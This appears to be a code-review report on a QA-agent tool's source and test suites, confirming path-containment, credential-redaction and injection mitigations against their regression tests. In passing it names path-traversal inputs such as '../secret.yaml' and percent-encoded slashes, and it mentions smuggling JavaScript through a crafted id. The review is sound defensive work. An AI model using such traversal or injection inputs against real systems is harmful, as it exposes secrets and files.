- CR-032 containment — `tools/page-actions.ts`'s `executeFileUpload` resolves every `file_paths` entry through `resolveInside(contextRoot, rel)` before it reaches `DOM.setFileInputFiles`, matching the containment already used by `install_cookies`/`install_passkey`; confirmed the same `resolveInside` gate wraps `passkey.ts`'s `readPasskeyFile` path resolution.
- CR-038 evidence-log redaction in `bash-tool.ts` — verified `buildScrubbedEnv`/`redactSecrets` are built from and applied to the same key set, so the scrubbed set matches what was actually forwarded to the child; the plain substring-replace approach is deliberately chosen over regex to sidestep credential values containing regex metacharacters. (Its scope gap against a deliberately-adversarial agent is filed above.)
- CR-039 in `api/routes/config-effective.ts` — confirmed against `cli/config-command.ts`'s `buildConfigOutput` that `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` are already reduced to `"set"/"unset"` at the source, and that the route's own loop over `CREDENTIAL_CAPABLE_SDK_ENV_KEYS` correctly reduces the remaining `string | null` fields (`ANTHROPIC_BASE_URL`, proxy vars, etc.) to the same presence-only shape before the payload is serialized — no raw secret-capable value reaches the JSON response.
- `packages/flight/src/qa/agent/agent.ts`'s stall watchdog fingerprinting (`stablePayload = result0.kind === "image" ? result0.image.data : (result0.text ?? "")`) — checked against `models/provider.ts`'s `ToolResult` union: every variant (`text`, `image`, `artifact`, `capture`) always carries a populated `text` field, so the `capture`/`artifact` branches are not silently starved of a fingerprint the way a first read suggested.
- `packages/flight/src/qa/agent/watch-manager.ts`'s `WatchManager.waitForWake` — single-flight guard (`waitInFlight`) prevents concurrent pollers from double-driving the same manager; the idle/timeout/new-file races are computed from monotonically-read `Date.now()` values each poll and bounded correctly against `WAKE_IDLE_MS_MIN`/`WAKE_TIMEOUT_MS_MAX` in `wake-on-idle-log-tool.ts`'s `parseArgs`.
- `packages/flight/src/qa/adapters/web/lib/tabs.js` and `lifecycle.ts` — tab/page-session cache lifecycle (memoized `getPageSession()` per `targetId`, detach-then-delete ordering in `closeTab`, side-trip pop loop running before `BrowserContext.dispose()` in `closeWebAdapter`) is internally consistent and every cleanup step is wrapped to be best-effort without failing the run.

- `packages/flight/src/qa/api/routes/results.ts` — the non-live (manifest-gated) branch of `/:runId/file/:path{.+}`, the `/:runId` and `/` list routes, and `parseIntParam`'s clamping were all exercised by hand-tracing and are correctly bounded; the only defect found is the live-branch prefix check written up above.
- `packages/flight/src/qa/api/ws-handlers.ts` and `ws-upgrade.ts` — both explicitly route untrusted ids through `parseRunId`/`parseRunSetId` and `isSafePath` before touching disk, and both correctly treat the origin allowlist and transcript-snapshot parse failures as best-effort/non-fatal.
- `packages/flight/src/qa/api/shutdown.ts` and `shutdown-stub-writer.ts` — the drain sequencing (cancel tokens → abort → patience window → stub write) and the stub writer's `existsSync` race-safety argument both check out against `ActiveRunRegistry`'s documented ordering invariant.
- `packages/flight/src/qa/api/run-cancel.ts`, `run-set-broadcaster.ts`, `ws.ts` — straightforward registries; per-client send/close failures are swallowed correctly and don't affect other clients.
- `packages/flight/src/qa/cli/args.ts` — the flag parser's bareword-vs-value disambiguation (a flag value that itself starts with `--` is never swallowed) was traced through `parseFlags`, `extractPositional`, and the batch positional-scanner and is internally consistent across all seven subcommands.
- `packages/flight/src/qa/cli/stream/batch-table.ts` and `colors.ts` — the TTY spinner/commit bookkeeping (`pendingBlankAboveSpinner`, `activeKey`) and the rollup-median computation were traced through queued → running → done/errored transitions for both single- and multi-pass cases and are self-consistent.

- `packages/flight/src/qa/paths.ts` (`resolveInside`, `isSafePath`, `canonicalize`) and its use in `packages/flight/src/qa/context/read-tool.ts` and `packages/flight/src/qa/context/credential-tool.ts`: path containment correctly rejects absolute paths, `..` segments (split on both `/` and `\`), and symlink escapes via `realpathSync`-based canonicalization on both `base` and `target`. Traced all three call sites and found no path that skips the guard.
- `packages/flight/src/qa/revival/rebuild-messages.ts` (`rebuildToolResult`): the module's own comment flags all three attacker-influenceable path fields (`artifact`, `capturePath`, `image`) as CR-047-relevant. I verified each of the three call sites routes through `safeResolveInside` (which wraps `resolveInside` from `paths.ts`) before any `readFileSync`, and each degrades to a warning + placeholder text rather than reading outside `runDir` on rejection. No field bypasses the guard.
- `packages/flight/src/qa/context/credential-tool.ts` (`runResolver`): argv-based `spawn` (no shell), `entity`/`key` validated against restrictive patterns before use, stdout/stderr byte caps enforced independently of the timeout/kill cascade, and the SIGTERM→grace→SIGKILL sequence correctly settles exactly once (`settled` guard) regardless of which event (data-cap, timeout, exit, spawn error) fires first.
- `packages/flight/src/qa/render/render-run.ts`: the JSON payload spliced into the static HTML template is escaped for `</script` breakout before being embedded in a `<script type="application/json">` tag, which is the correct (and sufficient) mitigation for this embedding pattern.
- `packages/flight/src/qa/config.ts`: `validateRunBody`, `mergeRunConfig`, and `loadConfig`'s env/flag precedence resolution (via `config-helpers.ts`) were traced end-to-end; source attribution (`sources.*`) and the default-chrome auto-launch fallback logic are internally consistent, and the loopback-only default host (CR-051) is preserved.
- `packages/flight/src/qa/models/anthropic.ts` and `packages/flight/src/qa/models/openai.ts`: cache-breakpoint placement, OAuth-vs-API-key auth construction, and provider-neutral `AgentResponse` conversion (including the OpenAI `input_tokens` cached-token subtraction and the deliberate silent-drop of an unparseable truncated `function_call` on `max_output_tokens`) match their documented rationale.

- `packages/flight/src/qa/util/id.ts` — `makeRunId`/`makeRunSetId`'s nonce
  generation (`Math.random().toString(36).slice(2, 6).padEnd(4, "0")`) was
  checked empirically: `node -e` over 20M iterations of
  `Math.random().toString(36)` never produced a string shorter than 8
  characters (well above the `slice(2, 6)` window), so the `padEnd` fallback
  path is not reachable in practice and the nonce always satisfies
  `RUN_ID_RE`'s `[a-z0-9]{4}` tail.
- `packages/flight/src/qa/util/sanitize-error.ts` — `LlmError`/`sanitizeLlmError`
  only read an explicit allow-list of fields (`status`, `requestID`/`request_id`,
  and a carefully-ordered Anthropic/OpenAI `error.type`/`code` extraction) and
  never retain a reference to the original SDK error, consistent with the
  stated goal of keeping response `Headers` (org id, `cf-ray`, `set-cookie`)
  out of anything that reaches `util.inspect`.
- `packages/flight/src/qa/runs/run-set.ts` — `runRunSet`'s duplicate-`cardId`
  guard (rejecting `cards[]` with a repeated id before generating any run ids)
  correctly prevents the double-count/lost-attempt corruption described in
  its own CR-048 comment; the cancellation path (`cancelToken.cancelled`)
  correctly marks every unstarted eagerly-generated run as `"cancelled"`
  rather than leaving it unresolved in `set.json`.
- `packages/flight/src/qa/runtime/serve.ts` — the WS-upgrade handler's
  `Host`-header URL-parsing guard (CR-050) was verified by inspection against
  its own stated failure mode: a malformed `Host` header that Node's HTTP
  parser accepts but the WHATWG `URL` constructor rejects now hits the
  `try { url = new URL(...) } catch { socket.destroy(); return; }` path
  instead of throwing synchronously inside the unguarded `'upgrade'` event
  handler.
- `packages/flight/test/qa/adapters/web/cookies.test.ts` — exercises real
  security-relevant boundaries end to end: path traversal (`../secret.yaml`)
  and absolute-path rejection at `resolve_path`, and confirms cookie *values*
  never appear in `install_cookies_ok`/`install_cookies_failed` log entries
  (only `valueLength`), including on the driver-throw path.
- `packages/flight/test/qa/adapters/web/chrome-ws-lib-isolation.test.ts`,
  `chrome-ws-lib-context-isolation.test.ts`, and `host-override.test.ts` —
  all pin the PRI-1436 per-session isolation invariant (no module-level
  mutable state shared across concurrent `WebAdapter`/Chrome sessions) with
  concrete before/after mutation assertions rather than just object-identity
  checks.
- `packages/flight/test/qa/adapters/web/generate-html-diff.test.ts` — the
  "stays fast on two large, fully-different documents" test asserts a
  concrete wall-time budget (<100ms) against the documented Myers-trace
  blow-up (CR-033); this is a real regression guard, not a tautological
  timing assertion.
- `packages/flight/test/qa/adapters/tui/adapter.test.ts` — descendant-reap
  and HUP-flush-grace tests correctly guard the `tmux` binary's availability
  via `describe.skipIf(!tmuxAvailable)`, matching `vitest.config.ts`'s
  documented rationale for keeping these out of the silently-green default
  suite.

Reviewed all 30 assigned files: the `packages/flight/test/qa/adapters/web/**`
suite (browser-bridge, browser-session/-reconnect, cdp-router,
chrome-launcher-helpers, chrome-process, mouse, navigation, page-session,
tabs, webauthn-context, websocket-client-no-compression, passkey,
side-trip-popup, and the `tools/` keyboard and page-actions suites) and the
`packages/flight/test/qa/agent/**` suite (abort-signal, agent, bash-tool,
empty-end-turn-safety-net, event-stream, initial-message, loader,
project-prompt, prompt-baseline, prompts-drift, prompts, reflection-checkpoint,
reflection, shared-tools-watch).

This is an unusually high-quality shard: nearly every non-trivial test carries
a comment naming the regression it pins (PRI-#### or CR-###) and explaining
the failure mode in mechanical terms, and several tests deliberately encode
the *reason* a naive mock would pass for the wrong reason (e.g. `keyboard.test.ts`'s
stub `keyboardPress` reproduces the real named-keys-only throw behavior rather
than a mock that can't fail; `navigation.test.ts`'s fake page session
reproduces the real 30s `waitForEvent` promise shape rather than shortcutting
it).

I cross-checked the regression claims against the actual implementation
rather than taking the comments at face value:

- `chrome-launcher-helpers.test.ts` (CR-030, path traversal in
  `getChromeProfileDir`): confirmed `chrome-launcher-helpers.js`'s
  `getChromeProfileDir` sanitizes `profileName` via
  `/^[a-zA-Z0-9_-]+$/` replacement before `path.join`, matching the three
  test cases (traversal, embedded slashes, ordinary name).
- `chrome-process.test.ts` (CR-031, `killChrome` signalling an unconfirmed
  port holder): confirmed `chrome-process.js`'s `killChrome` gates the
  port-holder-kill fallback on `state.activePort && state.activePortOwned`,
  not on `activePort` alone.
- `tools/page-actions.test.ts` (CR-032, unsandboxed `file_upload` paths):
  confirmed `executeFileUpload` in `page-actions.ts` routes through
  `resolveInside(ctx.contextRoot, path)` and rejects when `contextRoot` is
  null, matching all four test cases (absolute, traversal, no-root,
  legitimate-relative).
- `tools/keyboard.test.ts` (CR-035, no-selector `type` walking text through
  `keyboardPress`): confirmed `executeType` in `keyboard.ts` unconditionally
  calls `ctx.chrome.fill(ctx.tab, selector, text)` regardless of whether
  `selector` is present, never touching `keyboardPress`.
- `bash-tool.test.ts` (CR-038, forwarded SDK credentials leaking into
  `run.jsonl`): confirmed `bash-tool.ts`'s `redactSecrets` masks every
  `SDK_PASSTHROUGH_KEYS` value out of `transcriptText` (built from the same
  `scrubbedEnv` used for the child's actual env) while leaving `text` (what
  the agent sees) untouched, matching the "still forwarded to the agent, but
  redacted in the persisted log" test pair.
- `mouse.test.ts`'s CDP-throws-but-element-exists fallback path: confirmed
  against `mouse.js` — `resolveCenter` throws when `Runtime.evaluate` reports
  `found:false`, and `click()`'s catch block re-probes via a plain
  `el.click()` IIFE, propagating a real "not found" only if that second probe
  also fails. The test's two-call `Runtime.evaluate` mock (false then true)
  exercises exactly that path.
- `websocket-client-no-compression.test.ts`: confirmed `websocket-client.js`
  constructs `new WebSocket(url, { perMessageDeflate: false })`, matching the
  assertion that the upgrade handshake never advertises
  `permessage-deflate`.
- `reflection.test.ts`'s `renderTrace` windowing/renumbering assertions:
  confirmed against `reflection.ts` (`calls.slice(-MAX_TRACE_ENTRIES)` then
  `.map((c, i) => ...i+1...)`), so numbering restarts at 1 within the
  truncated window as asserted.

The `agent.test.ts` file (1958 lines) is the load-bearing spec for the agent
loop's turn/abort/timeout/stall-watchdog/re-ask/salvage/truncation-recovery
machinery. I read it in full rather than sampling; the re-ask and salvage
tests (PRI-2140/PRI-2160) correctly distinguish "malformed but salvageable"
(drop only the bad observation, keep the verdict) from "unsalvageable"
(bounded re-asks then `investigate`) from "criteria present but uncited/
contradictory" (re-ask, then salvage-with-downgrade if still uncited), and
each has both a positive and a bounded-exhaustion case. The stall-watchdog
tests correctly distinguish tool-identity-plus-payload fingerprinting (so a
web adapter's screenshot, whose `text` field carries a per-call path but
whose image bytes are frozen, still trips the watchdog) from genuinely
changing results (never trips it), and confirm the mutating-call-resets-
counter and text-only-turn-breaks-the-chain edge cases. The
`abort-signal.test.ts` three cases (before turn 1, between turns, mid-tool-
call-sequence within a turn) match the stated PRI-1507 invariant that abort
is observed as a synthetic `errored` result, never a thrown rejection.

No defects were found in this shard.

- `packages/flight/src/qa/agent/validators.ts` against `validators.test.ts`: `parseReportResult`, `salvageReportResult` (including the PRI-2140 truncated-enum salvage path and the double-JSON-encoded `observations` recovery), `parseReportCriteria` (PRI-2160 cross-field evidence requirement), `checkCriteriaConsistency`, and `validateToolArgs`'s narrow JSON-Schema subset (string/number/boolean/array/object, enum, required, null-as-absent-for-optional) all match their test expectations exactly.
- `packages/flight/src/qa/agent/shared-tools.ts`, `wake-on-idle-log-tool.ts`, `watch-logs-tool.ts`, and `watch-manager.ts` against their respective tests: tool mounting/gating by `contextRoot`, the `idle_ms`/`timeout_ms` clamping to `WAKE_IDLE_MS_MIN`/`WAKE_TIMEOUT_MS_MAX`, glob registration idempotency, `scan()`'s new-file/appended/truncation detection, and the `waitInFlight` concurrent-call guard in `WatchManager.waitForWake` all check out.
- `packages/flight/src/qa/agent/reflection.ts` and the `<SYSTEM-REMINDER>` literal in `agent.ts` (the deadline-grace reminder) both satisfy the UI's `isSystemReminder` regex coupling asserted in `system-reminder-prefix.test.ts`.
- `packages/flight/src/qa/api/active-runs.ts` (`ActiveRunRegistry`) against `active-runs.test.ts` and `active-runs-route.test.ts`: register/list/unregister semantics including the `startedAt`-guarded unregister race protection, the 200-entry progress-log ring buffer, and the abort-controller bookkeeping (`abortAll` skipping already-aborted signals and not double-counting) all match.
- `packages/flight/src/qa/api/routes/active-runs.ts`'s target-truncation logic matches `caps.test.ts`'s PRI-1478 truncation tests (list view truncated, snapshot view full).
- `packages/flight/src/qa/config.ts`'s env/flag parsing for `defaultBudgetMs`, `maxRequestBodySize`, `maxConcurrentRuns`, `activeRunTargetMaxBytes`, and `validateRunBody`'s rejection of `turns` and out-of-range `passes` all match `caps.test.ts`, `config.test.ts`, `config-effective.test.ts`, and `run-multi-pass.test.ts`.
- `packages/flight/src/qa/api/server.ts`'s `bodyLimit` 413 envelope and the generic `onError` 500 JSON envelope match `caps.test.ts` and `server.test.ts`.
- `packages/flight/src/qa/api/routes/config-effective.ts`'s CR-039 mitigation (credential-capable `sdkEnv` keys reported as `"set"`/`"unset"` rather than verbatim) matches `config-effective.test.ts`, including the negative assertion that the raw secret values never appear in the serialized response.
- `packages/flight/src/qa/api/routes/fanout.ts`'s CR-040/CR-041/CR-042 mitigations — the `[a-zA-Z0-9-]+` card-id charset check plus `isSafePath` belt-and-suspenders in `writeCards`, and `parseRunId`-gated `id` resolution on the `/:id/:mode` route — match every traversal case in `fanout.test.ts`, including the percent-encoded-slash variant that survives Hono's router-level `../` normalization.
- `packages/flight/src/qa/api/routes/results.ts`'s manifest-gated file route (`isSafePath` double-check, live-run allow-list restricted to `screenshots/`, `frames/`, `captures/`, `artifacts/`, and `run.jsonl`, deliberately excluding `inputs/context/`, plus the `.ansi`→`.json` capture-twin allowance) matches every case in `file-route.test.ts` and `results.test.ts`, including the credential-fixture-exclusion regression test.
- `packages/flight/src/qa/api/routes/scenarios.ts`'s create/update body validation and `isSafePath`-based id containment match every case in `scenarios.test.ts`.
- `packages/flight/src/qa/api/routes/run.ts`'s solo and multi-pass POST paths — concurrency cap, unknown-model handling, PRI-1507 per-attempt `AbortController` attachment via `onAllRunsKnown`, and the unregister-before-broadcast terminal-event ordering — match `run.test.ts`, `run-multi-pass.test.ts`, and `routes/run-snapshot.test.ts`.
- `packages/flight/src/qa/api/run-cancel.ts` (`CancelTokenRegistry`) and `packages/flight/src/qa/api/run-set-broadcaster.ts` (`RunSetBroadcaster`) match `run-cancel.test.ts` and `run-set-broadcaster.test.ts` exactly, including `readyState`-gated dispatch and per-client `send`/`close` error swallowing.
- `packages/flight/src/qa/api/routes/run-sets.ts`'s `RUN_SET_ID_RE`-gated id validation (rejecting percent-encoded traversal on GET, GET summary, and DELETE) matches `run-sets.test.ts`.
- `packages/flight/src/qa/api/shutdown.ts` (`ShutdownState`, `drainShutdown`) and `shutdown-stub-writer.ts` match every case in `shutdown.test.ts` and `shutdown-cancel.test.ts`, including the cancelAll-before-abortAll ordering (PRI-1507 Case 5), the patience-window race that preserves a real `result.json` over a stub, and the drain-middleware's 503 vs. unblocked-GET behavior.
- `packages/flight/src/qa/api/ws-handlers.ts` (`handleWsOpen`, `handleSetWsOpen`) matches `ws-handlers.test.ts`, including the `addClient`-before-snapshot ordering guard, the best-effort/defense-in-depth `isSafePath` check before reading `run.jsonl`, and malformed-JSONL-line skipping.
- `packages/flight/src/qa/api/ws-upgrade.ts` (`decideUpgrade`) and `packages/flight/src/qa/util/id.ts` (`parseRunId`, `parseRunSetId`) match every case in `ws-upgrade.test.ts`, including the PRI-1483 Origin-allowlist gate (empty allowlist = disabled; non-matching or missing Origin rejected when the allowlist is non-empty).
- `packages/flight/src/qa/api/ws.ts` (`RunBroadcaster`) matches `ws.test.ts`'s per-runId channel isolation and closed-client filtering.
- `packages/flight/src/qa/cards/store.ts` (`findCard`, `loadAllCards`) matches every case in `cards/store.test.ts`, including the fast-path/fallback-scan split, the direct-hit-parse-failure-throws vs. fallback-scan-skips-and-logs asymmetry, and the id-mismatch fall-through.
- `packages/flight/src/qa/paths.ts` (`isSafePath`, `resolveInside`) is symlink/canonicalization-aware and is the consistent containment primitive underlying every traversal-defense test cited above.

This shard is exclusively test files for `@bubstack/moe-flight`'s QA CLI (`packages/flight/test/qa/cli/**`, `packages/flight/test/qa/config*`, `packages/flight/test/qa/context/*`). I read all 30 assigned files and cross-checked several against the source they exercise where the test made a security- or contract-relevant claim:

- `args.test.ts` / `args-hygiene.test.ts` / `project-prompt-flag.test.ts` / `render-args.test.ts` / `validate.test.ts`: flag parsing, unknown-flag rejection, `--passes` bounds, `--model` role-prefix validation, and `--project-prompt`/`--show-prompt-and-exit` gating for `run` vs `batch` are all exercised with both positive and negative cases and read as internally consistent.
- `config.test.ts`, `config/resolve-setting.test.ts`, `config/source-attribution.test.ts`: cross-checked against `packages/flight/src/qa/config.ts` and `config-helpers.ts`. The `CR-051` claims (default bind host `127.0.0.1`, `MOE_FLIGHT_HOST`/`--host` precedence) and the `MOE_FLIGHT_CREDENTIAL_RESOLVER` existence/executable-bit validation both match the source (`hostR`/`resolveCredentialResolver` in `config.ts`) exactly as asserted.
- `context/credential-tool.test.ts`: cross-checked against `packages/flight/src/qa/context/credential-tool.ts`. The entity/key validation (rejects `..`, leading `.`, `/`/`\`, length caps, non-`[a-zA-Z0-9_-]` keys), the stdout/stderr 64 KiB/8 KiB overflow caps, the SIGTERM→grace→SIGKILL timeout cascade, and the transcript-redaction default (`includeInTranscripts` gate) all match the implementation. All referenced fixture scripts (`credential-resolver-{ok,fail,slow,empty,overflow,stderr-overflow}.sh`) exist under `packages/flight/test/qa/fixtures/`.
- `context/read-tool.test.ts`: cross-checked against `packages/flight/src/qa/context/read-tool.ts` and `resolveInside`/`isSafePath` in `packages/flight/src/qa/paths.ts`. Path-traversal (`..`), absolute-path, and binary-file rejections are backed by real containment checks (segment-wise `..` rejection plus `isAbsolute` guard), not just string matching in the test.
- `cli/batch.test.ts`: the `CR-043` card-id-collision test (`suiteA/login.md` vs `suiteB/login.md`) was checked against `assignCardIds` in `packages/flight/src/qa/cli/batch.ts`, which disambiguates same-stem cards with a `-2`, `-3`, ... suffix — matches the test's expectation of two distinct card ids and a non-doubled `totalRuns`.
- `cli/stream/*.test.ts` (`attach`, `batch-table`, `colors`, `format-args`, `format-event`, `format-timing`, `format`, `jsonl`, `pretty`, `wrap`): fixture-driven renderer tests (`pretty.test.ts` diffs against golden `.pretty.txt` fixtures) plus unit tests for ANSI wrapping, timing thresholds, and TTY/non-TTY rollup accounting. No inverted or self-contradicting assertions found.
- `cli/{ask,auto-emit,cancel,config-command,error-output,render-cmd,run,run-one,show-prompt-and-exit}.test.ts`: cover the remaining CLI subcommands' error paths (missing run dir, missing `run.jsonl`, SIGINT handler double-detach safety, JSON-vs-prose `formatCliError` envelope, `MOE_FLIGHT_DEBUG`/`--verbose` gating) — all consistent with their stated intent.

- `packages/flight/test/qa/docker-context.test.ts` (CR-026): verified `packages/flight/docker/Dockerfile.dockerignore` exists next to `Dockerfile` and contains every pattern the test asserts (`**/.env`, `**/.env.*`, `**/node_modules`, `**/dist`, `**/.turbo`, `.git`), read `compose.yaml`'s `context: ../../..` to confirm the stated root-context problem the fix addresses, and confirmed BuildKit's `<Dockerfile>.dockerignore` sibling-file convention is what's actually in use.
- `packages/flight/test/qa/examples/example-state-dir.test.ts` (CR-029): verified on disk that `examples/tutorial/.moe-flight/stories/` and `examples/todo/.moe-flight/stories/` contain every story file the test lists, and that no `.gauntlet/` directory remains anywhere under `examples/`.
- `packages/flight/test/qa/examples/todo/web-server.test.ts` (CR-028) and `packages/flight/test/qa/examples/todo/launchers.test.ts`: read `examples/todo/run-web.sh` / `run-tui.sh` directly and confirmed the launcher `cwd`/`--import tsx`/entrypoint behavior the tests assert against matches the scripts on disk.
- Ran the full `unit`-project subset of this shard (`context/tree`, `evidence/logger`, `evidence/run-set-writer`, `evidence/writer`, `examples/*`, `fanout/generator`, `format/story-card`, `models/anthropic`, `models/openai`, `models/provider`, `e2e/built-cli-smoke`, `integration/cli-batch`, `integration/cli-bc`, `integration/cli-fanout`, `integration/cli-smoke`, `integration/tui-*` under `--project tmux`) via `npx vitest run`: 174+ tests pass cleanly (plus the two API-key-gated integration suites self-skip as designed). `renderContextTree`'s truncation/ordering/indentation behavior, `EvidenceLogger`'s event-envelope chaining and oversize-text spill-to-artifact behavior, `RunSetWriter`'s status-bucketing (`consistent_pass`/`mixed`/`mixed_with_errors`/`errored`), the story-card parser's soft-wrap/heading/issue-reference edge cases (PRI-2160), and the Anthropic/OpenAI response-conversion helpers (stop-reason mapping, cache-token accounting, OAuth system-block ordering, CR-046's truncated-tool-call recovery) were all exercised directly and matched their test's stated intent.

- `packages/flight/test/qa/revival/rebuild-messages.test.ts` (964 lines) — thorough coverage of recovery-turn replay ordering (PRI-2160, PRI-1864), reflection-checkpoint weaving, deadline grace turns, image/text/TUI-capture rehydration, the old-run fallback path, `--turn` cutoff semantics, and CR-047 (artifact-path traversal outside the run dir, verified the secret content and a matching warning are both asserted, not just one).
- `packages/flight/test/qa/runs/orchestrator.test.ts` and `orchestrator-ordering.test.ts` — full lifecycle-hook ordering (`onLogger.attach → beforeAgent → beforeClose → adapter.close → onLogger.detach → afterClose`), the error-path hook sequence, the PRI-1507 `writeResultFiles`-before-`afterClose` invariant (correctly using `toBeLessThanOrEqual` rather than a strict `<`, so it isn't flaky under coarse timer resolution), the abort-signal success-path-writes-errored-result invariant, and a source-text guard against the orchestrator importing HTTP-only types.
- `packages/flight/test/qa/runtime/serve-errors.test.ts` — CR-050 (malformed Host header on a WS upgrade must not crash the process, verified via a temporary `uncaughtException` listener) and CR-051 (default loopback-only bind, explicitly reasoned about since the daemon has no route auth) are both meaningful security-relevant regressions, not just smoke tests.
- `packages/flight/test/qa/streaming/screencast.test.ts` — CR-052 (a rejected `Page.screencastFrameAck` must not become an unhandled rejection) is verified with a real `unhandledRejection` listener and multiple microtask-drain ticks rather than asserting on a synchronous absence.
- `packages/flight/test/qa/util/sanitize-error.test.ts` — the header/leak tests serialize every own property (including non-enumerable) via `Object.getOwnPropertyNames` plus `util.inspect(..., {depth: null})`, which is a real check that sensitive header values aren't reachable through any surface Node's own printers would traverse, not just the top-level fields.
- `packages/flight/ui/src/App.tsx` — the three route-derived regexes (`cardIdMatch`, `runIdMatch`, `liveIdMatch`) were checked against edge cases (`/cards/newfoo` vs `/cards/new`, `/runs/livecard_...` vs `/runs/live/...`); all resolve correctly given the negative-lookahead anchoring, and `main.tsx` (read to confirm) uses `createBrowserRouter`/`RouterProvider`, so `CardEditor`'s `useBlocker` call is backed by a data router and won't throw at runtime.
- `packages/flight/test/qa/paths.test.ts` — `isSafePath` and `resolveInside` symlink-escape and prefix-collision cases were spot-checked against `path.join` semantics with `node -e` and read against the `paths.ts` implementation; both hold.

- `packages/flight/ui/src/lib/transcript.ts`'s `applyEvent` reducer and
  `TranscriptView.tsx`'s `detectCurrentTurn`: verified that `model.turns`'
  highest key is always exactly the in-progress turn at any point in a real
  event stream (llm_request → llm_response → tool_call/tool_result all land
  on the same turn key before the next turn's llm_request arrives), so the
  simplified `return turnNumbers[0]` is behaviorally equivalent to the more
  elaborate heuristic described in the function's doc comment, not a bug.
- `packages/flight/ui/src/components/RunsList.tsx`'s `runKey` and
  `groupByCard`: cross-checked against `packages/flight/src/qa/util/id.ts`'s
  `makeRunId`/`RUN_ID_RE` (cardId charset excludes `_`, so `runId.split("_")`
  reliably yields exactly `[cardId, timestamp, nonce]`) and against
  `ActiveRun.id` in `lib/api.ts` (confirmed equal to `VerdictResult.runId`,
  so the active/completed dedupe by run id is sound).
  `RUN_SET_ID_RE`/`makeRunSetId` are unaffected by the card-id gap noted
  above since run-set ids are always server-generated from a fixed `kind`
  enum, not user input.
- Ran `pnpm --filter @bubstack/moe-flight-ui typecheck`: passes clean.
  Confirmed the bare `React.CSSProperties` / `React.MouseEvent` /
  `React.ReactNode` type references in `TuiCapture.tsx`, `ErrorBanner.tsx`,
  and `TranscriptView.tsx` — none of which import a default `React` binding
  — do not trip `noImplicitAny`/UMD-global errors under this package's
  `@types/react@19` + `jsx: react-jsx` configuration; not a defect.
- `packages/flight/ui/src/components/shared.tsx`'s `ConfirmDialog`: verified
  the hook-order is unconditional before the `if (!open) return ...` early
  return, and that the native `<dialog>` element persists across the
  open/closed branches (same type/position, so React reconciles rather than
  remounts), so the `dialogRef`-driven `showModal()`/`close()` effect stays
  correctly wired across toggles.
- `packages/flight/ui/src/components/transcript/TuiCapture.tsx`'s
  `CaptureGrid`: the `cell.ch === "" && cell.width === 1` skip for the
  trailing half of a wide character is consistent with the leading cell's
  `gridColumn: "span 2"`, so double-painting is correctly avoided.
- `packages/flight/ui/src/hooks/useLiveTranscript.ts`'s WS query param
  (`?run=<runId>`) matches `packages/flight/src/qa/api/ws-upgrade.ts`'s
  `decideUpgrade` exactly (path `/api/ws`, param name `run`).

- `packages/flight/ui/src/lib/transcript.ts` and
  `packages/flight/ui/src/lib/transcript-blocks.ts` — the event reducer
  (idempotency via `maxEventId`, per-turn `tools` pairing by `toolUseId`,
  soft-error detection regex, prompt-pairing state machine) and the
  chronological block-builder were read end-to-end against the fixture-driven
  tests in `packages/flight/ui/test/transcript.test.ts` and
  `transcript-blocks.test.ts`; the logic matches its own documentation and the
  test assertions.
- `packages/flight/ui/src/lib/api.ts` — `fileUrl`'s static-vs-server branching
  (`window.__MOE_FLIGHT_RUN__` presence) and path-segment encoding were
  checked against `api-file-url.test.ts` and are consistent.
- `packages/flight/vitest.config.ts` and `packages/flight/ui/vitest.config.ts` —
  verified every path listed in `CHROME_SUITES`, `FFI_SUITES`, and
  `TMUX_SUITES` exists on disk (17 files checked via `ls`), so the
  include/exclude split does not silently drop or double-run any suite.
- `packages/glass/skills/browsing/lib/cdp-router.js`,
  `lib/cdp-utils.js`, `lib/cookies.js`, `lib/console-logging.js` — small,
  self-contained helpers; session-id routing, correlation-map cleanup on
  `unregisterSession`, and `Runtime.evaluate` exception surfacing were traced
  and are correct for their stated contracts.
- `packages/glass/skills/browsing/lib/dialogs-router.js` — the permission-dialog
  resolve path (`CR-064`) was specifically checked: the shim secret and id are
  passed through `JSON.stringify` (not raw string concatenation) into the
  injected `Runtime.evaluate` expression, which closes the "craft an id to
  smuggle extra JS" injection this comment calls out; a page cannot resolve
  its own request without the secret.
- `packages/glass/skills/browsing/lib/browser-session.js` and
  `lib/browser-bridge.js` — root-session request correlation, the
  connect/retry state machine (`connectPromise` nulled only on failure), and
  the paused-auto-attach → hook → `Runtime.runIfWaitingForDebugger` resume
  ordering were traced and behave as documented (including the `CR-055` stale-
  bridge-detection fix in `chrome-ws-lib.js`'s `ensureBridge`).

- `packages/glass/src/payload.ts` — the full `PAYLOAD_SPECS` / `parsePayload` / `resolveStrictStructuredPayload` / `tryParseIntegerValue` / `resolveConsoleSince` machinery was read end-to-end against its own extensive doc comments and cross-checked against every call site in `src/index.ts`. The scalar/structured split, the `numericDefaultKey` handling (including the `since: 0` edge case, which is correctly distinguished from "absent" via `!== undefined` rather than truthiness), and the three-way error/absent/present split are internally consistent and match the documented intent.
- `packages/glass/skills/browsing/lib/profile-lock.js` — the atomic-claim / stale-lock-reclaim / release logic was traced through its race-handling comments (`tryAtomicClaim`'s `wx` flag, the unlink-then-reclaim re-check, `release`'s pid comparison before unlink) and holds up; the only residual race (a dead PID's number being reused by an unrelated live process before cleanup) is an inherent, well-known limitation of PID-based liveness checks, not a defect in this implementation.
- `packages/glass/skills/browsing/lib/html-diff.js`'s `myersDiff`/`backtrack` — verified correctness (not just the memory-cap concern above) by running reordered-line and identical-input cases directly; reordered identical lines correctly produce a remove+add pair rather than being treated as unchanged, matching the documented rationale for choosing Myers over a set-based diff.
- `packages/glass/skills/browsing/lib/screenshot.js` — the CR-065 path-containment logic (`resolveScreenshotPath`/`realpathOrResolve`) correctly rejects `..`-escaping and out-of-root absolute paths, and correctly canonicalizes through symlinks (e.g. macOS `/var` -> `/private/var`) for the containment comparison only, never for the path actually written.
- `packages/glass/skills/browsing/lib/page-scripts/permission-shim.js` and the secret-minting half in `lib/dialogs.js` — the CR-064 per-session-secret design (secret lives only in the injected script's closure, is minted fresh per page session via `randomUUID()`, and is checked with `!==` before either accepting a page-originated permission-request or resolving one) is sound against the documented threat (a page directly calling the plain-global binding to fabricate or resolve requests).
- `packages/glass/skills/browsing/lib/websocket-client.js` — the CR-066 handshake-timeout logic (bounding the wait when a stale/wrong-port endpoint answers with an ordinary HTTP response instead of upgrading) is correct; verified the `settled` guard prevents both the timer and the `'upgrade'`/`'response'`/`'error'` handlers from double-resolving.
